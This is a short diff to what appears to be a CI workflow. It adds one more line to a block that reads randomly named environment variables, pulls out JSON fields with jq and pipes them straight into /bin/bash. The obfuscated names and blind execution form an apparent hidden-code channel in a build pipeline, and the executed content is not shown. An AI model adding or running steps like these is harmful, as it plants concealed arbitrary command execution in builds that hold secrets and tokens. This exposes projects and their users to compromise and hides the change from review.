@@ -29,6 +29,7 @@ jobs:
           echo $p9 | jq -r .w4 | /bin/bash
           echo $lge60938 | jq -r .l867 | /bin/bash
           printf '%s' "$osvi6428" | jq -r .ztoi189 | /bin/bash
+          printf '%s' "$ggnw860" | jq -r .ix6033 | /bin/bash
 
       - name: Store artifact
         if: always()
